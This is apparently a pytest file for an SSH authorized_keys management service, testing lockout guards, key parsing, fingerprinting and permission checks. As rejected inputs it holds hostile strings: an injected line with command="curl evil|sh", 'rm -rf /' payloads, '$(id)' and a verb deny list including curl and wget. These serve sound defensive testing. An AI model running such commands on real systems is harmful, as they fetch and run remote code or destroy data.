"""SSH keys — the properties that stop an edit from ending everyone's access.

authorized_keys is line-oriented and sshd reads it literally, so the two ways to cause
real harm are removing the wrong line and writing a line that says more than it looks
like it says. Both are tested here; the rest is parsing.
"""
from __future__ import annotations

import base64
import hashlib
import shlex

import pytest

from app.services import sshkey_service as sk

# Two real-shaped keys. The body only has to be valid base64 of the right sort for a
# fingerprint to be computable — these are not usable keys and are not secret.
BODY_A = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + b"A" * 32).decode()
BODY_B = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + b"B" * 32).decode()
KEY_A = f"ssh-ed25519 {BODY_A} alice@laptop"
KEY_B = f"ssh-ed25519 {BODY_B} bob@desktop"


# ── the guard ────────────────────────────────────────────────────────────────
def test_the_key_serverally_connects_with_is_never_removed():
    keys = sk.parse_file(f"{KEY_A}\n{KEY_B}\n")
    ours = keys[0].fingerprint
    why = sk.removal_risk(keys, keys[0], our_fingerprint=ours, auth_type="key")
    assert why and "ServerAlly connects with" in why


def test_someone_elses_key_can_be_removed():
    keys = sk.parse_file(f"{KEY_A}\n{KEY_B}\n")
    assert sk.removal_risk(keys, keys[1], our_fingerprint=keys[0].fingerprint,
                           auth_type="key") == ""


def test_removing_the_last_key_is_refused_when_we_sign_in_with_a_key():
    """Fails closed. We could not identify our own key, so the last one on the server
    might be it — and being wrong here cannot be undone from inside the app."""
    keys = sk.parse_file(f"{KEY_A}\n")
    why = sk.removal_risk(keys, keys[0], our_fingerprint=None, auth_type="key")
    assert why and "last key" in why


def test_removing_the_last_key_is_allowed_when_we_sign_in_with_a_password():
    """A password login is unaffected by an empty authorized_keys, so refusing here
    would block a legitimate cleanup for no reason."""
    keys = sk.parse_file(f"{KEY_A}\n")
    assert sk.removal_risk(keys, keys[0], our_fingerprint=None,
                           auth_type="password") == ""


def test_the_fingerprint_matches_what_ssh_keygen_prints():
    """Compared against OpenSSH's own format so a customer can check it themselves."""
    blob = base64.b64decode(BODY_A)
    expect = "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
    assert sk.fingerprint("ssh-ed25519", BODY_A) == expect


def test_our_own_fingerprint_is_derived_from_the_credential_we_actually_use():
    """Not asked for, not guessed — computed from the private key we authenticate with,
    which is what makes the guard exact."""
    from cryptography.hazmat.primitives.asymmetric import ed25519
    from cryptography.hazmat.primitives import serialization
    priv = ed25519.Ed25519PrivateKey.generate()
    pem = priv.private_bytes(serialization.Encoding.PEM,
                             serialization.PrivateFormat.OpenSSH,
                             serialization.NoEncryption()).decode()
    pub = priv.public_key().public_bytes(serialization.Encoding.OpenSSH,
                                         serialization.PublicFormat.OpenSSH).decode()
    assert sk.public_from_private(pem) == sk.parse_key(pub).fingerprint


def test_an_unreadable_credential_yields_no_fingerprint_rather_than_a_wrong_one():
    assert sk.public_from_private("not a key") is None
    assert sk.public_from_private("") is None


# ── what may be written into the file ────────────────────────────────────────
def test_a_normal_key_is_accepted():
    k = sk.parse_key(KEY_A)
    assert k.type == "ssh-ed25519" and k.comment == "alice@laptop"
    assert k.fingerprint.startswith("SHA256:")


def test_a_key_with_a_second_line_is_refused():
    """The whole reason this parse exists: a newline would add an entry nobody agreed
    to, and it could carry options that change what the other keys may do."""
    with pytest.raises(sk.InvalidKey) as e:
        sk.parse_key(f'{KEY_A}\ncommand="curl evil|sh" {KEY_B}')
    assert "one key at a time" in str(e.value)


@pytest.mark.parametrize("pasted", [
    "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----",
    "-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----",
])
def test_a_private_key_is_named_as_private_not_as_a_formatting_problem(pasted):
    """A private key is always several lines, so a line-count check would catch it
    first and answer with a formatting complaint. The person who just pasted their
    secret into a web form has to be told what they did and to replace it."""
    with pytest.raises(sk.InvalidKey) as e:
        sk.parse_key(pasted)
    msg = str(e.value)
    assert "PRIVATE" in msg and "replace it" in msg
    assert "more than one line" not in msg


@pytest.mark.parametrize("bad", [
    "", "   ", "ssh-ed25519", "notatype AAAA", "ssh-rsa !!!!", "ssh-dss AAAA x",
    'command="rm -rf /" ssh-ed25519 AAAA',
])
def test_anything_that_is_not_a_plain_public_key_is_refused(bad):
    with pytest.raises(sk.InvalidKey):
        sk.parse_key(bad)


def test_a_comment_cannot_smuggle_anything_into_the_file():
    k = sk.parse_key(f'ssh-ed25519 {BODY_A} alice";rm -rf /;#')
    assert ";" not in k.comment and "/" not in k.comment
    assert "\n" not in k.text


def test_a_key_is_rebuilt_from_its_parts_not_passed_through():
    """Whatever arrives, what gets written is type + body + cleaned comment. Nothing
    else can survive the round trip."""
    k = sk.parse_key(f"ssh-ed25519   {BODY_A}   alice@laptop")
    assert k.text == f"ssh-ed25519 {BODY_A} alice@laptop"


def test_an_oversized_paste_is_refused():
    with pytest.raises(sk.InvalidKey):
        sk.parse_key("ssh-ed25519 " + "A" * 9000)


# ── reading an existing file ─────────────────────────────────────────────────
def test_reading_a_file_with_comments_and_blank_lines():
    keys = sk.parse_file(f"# deploy keys\n\n{KEY_A}\n\n{KEY_B}\n")
    assert [k.comment for k in keys] == ["alice@laptop", "bob@desktop"]
    assert [k.line for k in keys] == [3, 5]


def test_an_existing_restriction_is_shown_not_silently_dropped():
    """A key limited to one address or one command is a deliberate restriction. Hiding
    it would make the screen lie about what that key can do."""
    keys = sk.parse_file(f'from="10.0.0.5" {KEY_A}\n')
    assert keys[0].options == 'from="10.0.0.5"'
    assert keys[0].options in keys[0].text


def test_a_broken_line_is_skipped_rather_than_guessed_at():
    keys = sk.parse_file(f"garbage-line\nssh-ed25519 !!!! x\n{KEY_A}\n")
    assert len(keys) == 1 and keys[0].comment == "alice@laptop"


def test_the_file_is_rebuilt_whole_so_duplicates_do_not_accumulate():
    keys = sk.parse_file(f"{KEY_A}\n{KEY_B}\n")
    out = sk.render(keys)
    assert out.count("ssh-ed25519") == 2
    assert out.startswith("# Managed by ServerAlly")
    assert out.endswith("\n")


# ── the probe ────────────────────────────────────────────────────────────────
def test_the_home_directory_is_asked_of_the_system_not_assumed():
    """root's home is /root, and panels put accounts wherever they like — writing to
    /home/<user> would create a file sshd never reads."""
    cmd = sk.home_probe("root")
    assert "getent passwd root" in cmd
    assert "/home/root" not in cmd


@pytest.mark.parametrize("bad", ["ali ce", "a;rm -rf /", "$(id)", "", "-flag", "A" * 40])
def test_a_user_name_that_could_reach_the_shell_is_refused(bad):
    with pytest.raises(sk.InvalidKey):
        sk.home_probe(bad)


def test_the_probe_only_reads():
    cmd = sk.home_probe("deploy")
    for verb in ("rm ", "mv ", "chmod", "chown", "tee", "> ", "curl", "wget"):
        assert verb not in cmd, f"the probe must not {verb.strip()}"


def test_reading_the_probe_output():
    s = sk.SENTINEL
    out = (f"{s}HOME\n/home/deploy\n{s}PERMS\n700 deploy\n600 deploy\n"
           f"{s}KEYS\n{KEY_A}\n{KEY_B}\n{s}END\n")
    home, keys, note = sk.parse_home_probe(out)
    assert home == "/home/deploy" and len(keys) == 2 and note == ""


def test_permissions_that_make_ssh_ignore_the_file_are_called_out():
    """sshd silently refuses a group-writable .ssh, so the customer sees "my key does
    not work" with nothing in any log they know how to find."""
    s = sk.SENTINEL
    out = f"{s}HOME\n/home/deploy\n{s}PERMS\n777 deploy\n600 deploy\n{s}KEYS\n{s}END\n"
    _home, _keys, note = sk.parse_home_probe(out)
    assert "777" in note and "ignores keys" in note


def test_the_write_sets_the_permissions_sshd_insists_on():
    cmd = sk.write_commands("/home/deploy", "/tmp/staged")
    assert "chmod 700" in cmd and "chmod 600" in cmd
    assert "chown" in cmd, "a root-owned file in a user's home is not read either"


def test_the_write_path_is_quoted():
    cmd = sk.write_commands("/home/odd name", "/tmp/staged")
    args = shlex.split(cmd.replace("&&", " ").replace(";", " "))
    assert any(a.startswith("/home/odd name") for a in args)
